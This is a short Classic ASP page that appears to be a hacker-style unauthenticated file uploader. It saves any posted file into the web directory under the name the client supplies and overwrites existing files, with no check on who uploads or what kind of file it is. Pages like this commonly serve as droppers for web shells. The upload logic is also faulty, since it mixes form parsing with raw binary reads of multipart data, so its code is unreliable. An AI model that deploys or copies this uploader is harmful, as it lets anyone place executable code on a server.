<%@ Language=VBScript %>
<%
Response.Buffer = True
On Error Resume Next

Dim output
output = ""

' ===================== UPLOAD HANDLING =====================
If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
    Dim fso, stream, fileName, savePath, binaryData
    
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    fileName = Request.Form("file") ' yeh sirf naam deta hai
    
    If Len(fileName) > 0 Then
        savePath = Server.MapPath(".") & "\" & fso.GetFileName(fileName)
        
        binaryData = Request.BinaryRead(Request.TotalBytes)
        
        Set stream = Server.CreateObject("ADODB.Stream")
        stream.Type = 1 ' adTypeBinary
        stream.Open
        stream.Write binaryData
        stream.SaveToFile savePath, 2 ' adSaveCreateOverWrite
        stream.Close
        
        If Err.Number = 0 Then
            output = "✅ File successfully uploaded: " & fso.GetFileName(savePath)
        Else
            output = "❌ Upload Failed: " & Err.Description & " (Error #" & Err.Number & ")"
        End If
    Else
        output = "No file selected."
    End If
End If

On Error GoTo 0
%>

<html>
<head>
    <title>Classic ASP Uploader</title>
    <style>body{font-family:monospace; background:#111; color:#0f0;}</style>
</head>
<body>
    <h2>Classic ASP Uploader</h2>
    
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file" />
        <input type="submit" value="Upload File" />
    </form>
    
    <hr>
    <pre><%= Server.HTMLEncode(output) %></pre>
    
    <% If output = "" Then %>
        <p>Upload karke dekho...</p>
    <% End If %>
</body>
</html>
